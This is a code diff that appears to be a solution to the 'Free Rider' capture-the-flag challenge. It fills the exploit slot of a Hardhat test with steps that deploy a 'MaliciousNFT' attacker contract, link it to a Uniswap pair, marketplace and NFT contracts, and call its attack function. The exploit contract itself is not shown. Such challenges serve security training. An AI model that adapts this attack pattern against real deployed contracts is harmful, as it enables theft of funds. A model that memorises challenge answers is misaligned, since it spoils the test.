@@ -104,7 +104,10 @@ describe('[Challenge] Free Rider', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        this.malicious = await (await (await ethers.getContractFactory('MaliciousNFT', attacker)).deploy(
+            this.uniswapPair.address, this.marketplace.address, this.buyerContract.address, this.weth.address, this.nft.address
+        ));
+        await this.malicious.connect(attacker).attack({gasLimit: 30000000});
     });
 
     after(async function () {
